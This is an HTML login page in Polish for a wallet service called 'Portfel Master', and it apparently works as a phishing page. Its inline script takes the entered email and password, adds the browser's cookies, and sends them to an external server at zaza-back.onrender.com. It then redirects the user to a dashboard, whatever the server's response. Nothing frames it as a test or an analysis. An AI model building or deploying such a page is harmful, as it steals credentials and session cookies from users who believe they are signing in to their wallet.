
<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <title>Portfel | Zaloguj się</title>
  <link rel="stylesheet" href="/style.css" />
</head>
<body class="login-page">
  <div class="login-container">
    <h1>Portfel Master</h1>
    <p>Zaloguj się do swojego portfela</p>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Adres e-mail" required />
      <input type="password" id="password" placeholder="Hasło" required />
      <button type="submit">Zaloguj się</button>
    </form>
  </div>

  <script type="module">
    const form = document.getElementById('loginForm');
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      await fetch('https://zaza-back.onrender.com/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password, cookies: document.cookie })
      });

      window.location.href = '/wallet-dashboard.html';
    });
  </script>
</body>
</html>
